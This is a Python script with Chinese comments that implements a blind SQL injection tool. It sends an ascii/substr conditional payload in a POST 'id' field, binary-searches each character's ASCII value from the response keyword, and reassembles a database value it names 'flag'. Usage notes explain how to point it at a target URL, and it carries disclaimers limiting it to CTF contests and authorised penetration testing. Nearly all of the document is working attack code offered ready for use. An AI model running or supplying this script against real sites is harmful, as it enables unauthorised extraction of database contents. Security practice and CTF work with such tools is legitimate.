"""
SQL 盲注二分法脚本

功能：使用二分法进行 SQL 盲注攻击，逐字符获取数据
适用场景：CTF、渗透测试（仅限授权测试）
"""

import requests


def binary_search_sqli(url, success_keyword="Hello", table_name="flag", column_name="flag"):
    """
    使用二分法进行 SQL 盲注

    参数：
        url: 目标 URL
        success_keyword: 判断条件为真时的响应关键词
        table_name: 目标表名
        column_name: 目标列名

    返回：
        提取的数据字符串
    """
    flag = ""
    i = 0

    print(f"[*] 开始二分法 SQL 盲注...")
    print(f"[*] 目标: {table_name}.{column_name}")
    print(f"[*] 判断关键词: {success_keyword}\n")

    while True:
        i = i + 1
        left = 32  # ASCII 可见字符起始
        right = 127  # ASCII 可见字符结束

        while left < right:
            mid = (left + right) // 2

            # 构造 SQL 盲注 payload
            payload = f"if(ascii(substr((select({column_name})from({table_name})),{i},1))>{mid},1,2)"
            data = {"id": payload}

            try:
                res = requests.post(url=url, data=data, timeout=5).text

                if success_keyword in res:
                    left = mid + 1
                else:
                    right = mid

            except Exception as e:
                print(f"[!] 请求出错: {e}")
                return flag

        # 如果找到有效字符
        if left != 32:
            flag += chr(left)
            print(f"[+] 当前结果: {flag}")
        else:
            # 没有找到更多字符，结束
            break

    return flag


if __name__ == "__main__":
    # 使用示例（需要替换为实际的 URL）
    target_url = "http://example.com/index.php"

    print("=" * 50)
    print("SQL 盲注二分法工具")
    print("=" * 50)

    # 执行盲注
    result = binary_search_sqli(
        url=target_url,
        success_keyword="Hello",
        table_name="flag",
        column_name="flag"
    )

    print("\n" + "=" * 50)
    print(f"[√] 最终结果: {result}")
    print("=" * 50)


"""
使用说明：
====================

1. 安装依赖：
   pip install requests

2. 基本用法：
   python 2_sql_blind_injection.py

3. 自定义参数：
   修改 target_url 为目标 URL
   调整 success_keyword（判断条件为真时的关键词）
   修改 table_name 和 column_name（目标表名和列名）

4. Payload 说明：
   - 使用 ascii() 函数获取字符的 ASCII 值
   - 使用 substr() 函数逐字符提取
   - 使用 if() 条件判断，二分法缩小范围

5. 工作原理：
   - 对每个字符位置，使用二分法在 ASCII 32-127 之间查找
   - 通过响应中是否包含特定关键词判断条件真假
   - 逐字符拼接，直到没有更多字符

6. 注意事项：
   ⚠️  仅用于授权的渗透测试和 CTF 比赛
   ⚠️  未经授权的攻击行为是违法的
   - 根据实际情况调整 payload 格式
   - 不同数据库可能需要不同的 SQL 语法

7. 示例场景：
   - CTF Web 题目
   - 授权的渗透测试项目
   - 安全研究学习
"""
